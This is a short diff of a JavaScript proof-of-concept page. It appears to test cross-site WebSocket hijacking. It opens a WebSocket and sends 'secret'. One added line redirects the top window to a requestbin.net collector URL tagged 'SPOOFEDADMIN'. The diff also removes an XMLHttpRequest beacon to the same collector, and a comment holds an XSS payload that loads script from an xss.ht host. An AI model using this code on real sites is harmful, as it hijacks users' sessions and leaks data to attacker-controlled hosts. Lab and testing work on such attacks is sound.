@@ -7,12 +7,10 @@
     websocket = new WebSocket(url)
     websocket.onopen = start
     websocket.onmessage = handleReply
+		  window.top.location="https://requestbin.net/r/34y37frp?m=SPOOFEDADMIN";
     function start(event)
     {
 	websocket.send('secret');
-	  var xhttp = new XMLHttpRequest();
-	xhttp.open("GET", "https://requestbin.net/r/34y37frp?m=MESSAGE_SENT", true);
-	xhttp.send();
         //websocket.send('<><><script src=https://pepecomacaxss.xss.ht>');
     }
 
